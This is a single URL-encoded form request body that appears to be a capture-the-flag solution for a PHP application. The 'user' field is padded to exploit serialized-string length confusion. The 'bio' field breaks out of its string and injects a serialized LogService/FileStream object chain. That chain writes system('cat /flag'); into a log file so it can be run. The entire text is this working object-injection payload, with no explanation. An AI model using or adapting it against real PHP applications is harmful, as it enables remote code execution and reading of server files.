user=hackerhackerhackerhacker&bio=AAAAA%22%3Bs%3A10%3A%22preference%22%3BO%3A10%3A%22LogService%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A10%3A%22FileStream%22%3A3%3A%7Bs%3A16%3A%22%00FileStream%00path%22%3Bs%3A11%3A%22exploit.log%22%3Bs%3A16%3A%22%00FileStream%00mode%22%3Bs%3A5%3A%22debug%22%3Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7Ds%3A12%3A%22%00%2A%00formatter%22%3BO%3A13%3A%22DateFormatter%22%3A0%3A%7B%7D%7D%3B%7D     
```



















